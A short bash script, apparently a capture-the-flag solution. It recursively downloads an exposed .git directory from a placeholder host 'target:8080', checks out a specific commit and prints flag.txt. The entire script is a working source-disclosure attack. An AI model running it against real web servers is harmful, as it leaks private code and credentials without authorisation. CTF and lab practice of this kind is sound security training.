#!/bin/bash

until wget --recursive --no-parent http://target:8080/.git/; do
    sleep 1
done
cd "target:8080"
git checkout 4ba5380

cat flag.txt
